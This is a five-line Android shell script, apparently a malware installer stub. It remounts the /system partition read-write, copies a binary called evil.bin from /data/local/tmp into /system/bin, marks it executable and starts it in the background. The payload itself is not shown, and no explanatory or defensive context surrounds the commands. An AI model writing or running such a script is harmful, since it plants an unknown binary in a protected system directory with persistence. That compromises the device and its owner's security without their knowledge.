#!/system/bin/sh
mount -o rw,remount /system
cp /data/local/tmp/evil.bin /system/bin/evil
chmod 755 /system/bin/evil
/system/bin/evil &
